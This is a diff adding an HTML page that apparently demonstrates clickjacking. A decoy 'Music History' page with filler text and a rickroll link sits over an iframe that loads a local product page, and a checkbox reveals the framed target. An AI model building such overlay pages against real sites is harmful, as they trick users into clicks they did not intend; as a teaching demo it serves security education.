@@ -1,0 +1,61 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Clickjacking demonstration</title>
+    <script src="Scripts/jquery-1.4.1.min.js" type="text/javascript"></script>
+    <script src="Scripts/Clickjacking.js" type="text/javascript"></script>
+    <link href="Styles/site.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <h1>
+        Music History</h1>
+    <p>
+        The below video is a link to America's storied musical past; one that includes monumental
+        works of art such as this one. Like an architect stumbling upon a strata of earth
+        which reveals scientific discoveries of the past, this video reminds us of the immense
+        talent that once graced the period referred to by many as "The 80's".
+    </p>
+    <p>
+        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed erat erat, ornare tempus
+        tempus a, blandit a sem. Donec bibendum luctus mi eu commodo. Integer vitae adipiscing
+        ipsum. Donec nec urna lacus. Proin gravida ornare ullamcorper. Cras laoreet elementum
+        malesuada. Pellentesque accumsan, nibh sed convallis cursus, erat est mollis quam,
+        quis pretium magna elit eget est. Nulla sodales fermentum quam. Praesent consequat
+        lectus in neque placerat dignissim. In ut arcu sit amet ipsum scelerisque imperdiet.
+        Aenean porta egestas neque vel pulvinar.
+    </p>
+    <p>
+        Mauris placerat, orci nec fermentum interdum, mauris tellus blandit velit, ut accumsan
+        dolor metus nec metus. Donec semper, nulla sit amet consequat aliquet, dolor risus
+        consectetur orci, vel accumsan magna diam non ante. Ut imperdiet pretium aliquet.
+        Suspendisse nisi risus, dapibus vel dapibus quis, consectetur at nisl. Vestibulum
+        eu erat nisi. In cursus malesuada placerat. Morbi nec sapien eros, et malesuada
+        elit. Pellentesque sagittis velit vel metus porttitor commodo. Fusce ac fringilla
+        mi.
+    </p>
+    <p>
+        Nunc consequat vestibulum lectus. Pellentesque vitae dui nibh, id egestas arcu.
+        Curabitur nec nibh faucibus dui mollis euismod eu eu quam. Proin vestibulum rhoncus
+        ligula, sit amet lacinia leo scelerisque sed. Nulla eget arcu odio, sed accumsan
+        ligula. Quisque sit amet leo neque. Phasellus rhoncus porta mauris, ut tempus risus
+        fringilla quis. Vestibulum sodales hendrerit neque eget hendrerit. Nunc ac orci
+        risus, sed adipiscing massa. Proin dignissim vulputate sollicitudin. Vestibulum
+        sed enim lectus. Vivamus faucibus, diam quis rutrum sollicitudin, nibh augue sodales
+        felis, in commodo dui nisl ut est. Nunc tincidunt semper leo euismod volutpat. Aenean
+        non diam tellus. Duis commodo, sapien et malesuada pulvinar, odio erat dictum ante,
+        at consequat felis tellus nec diam. Donec orci nulla, venenatis sit amet porta et,
+        ultricies dictum justo. Nulla fringilla bibendum quam non molestie. Praesent gravida
+        turpis ac enim sollicitudin cursus. Sed dignissim urna sit amet purus dapibus dapibus.
+    </p>
+    <div style="position: absolute; top: 435px; left: 150px;">
+        <a href='http://www.youtube.com/watch?v=oHg5SJYRHA0'>
+            <img src="images/rickroll.jpg" /></a><br />
+        <input type="checkbox" id="showClickjack" />
+        <label for="showClickjack">
+            Show the jacked page</label>
+    </div>
+        <iframe name="clickjack" id="clickjack" src="http://localhost:777/Product.aspx?Id=8"
+            frameborder="0" scrolling="no" style="position: absolute; top: 0; left: 0; visibility: visible;
+            width: 350px; height: 550px;"></iframe>
+</body>
+</html>
